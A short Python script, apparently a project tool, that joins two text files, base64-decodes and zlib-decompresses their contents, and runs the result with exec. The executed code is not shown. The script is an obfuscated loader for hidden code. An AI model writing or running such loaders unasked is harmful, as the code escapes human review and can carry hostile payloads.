from pathlib import Path
import base64
import zlib

root = Path(__file__).resolve().parents[1]
payload = (root / "tools/round7_payload1.txt").read_text().strip() + (root / "tools/round7_payload2.txt").read_text().strip()
exec(compile(zlib.decompress(base64.b64decode(payload)), "round7_payload.py", "exec"))
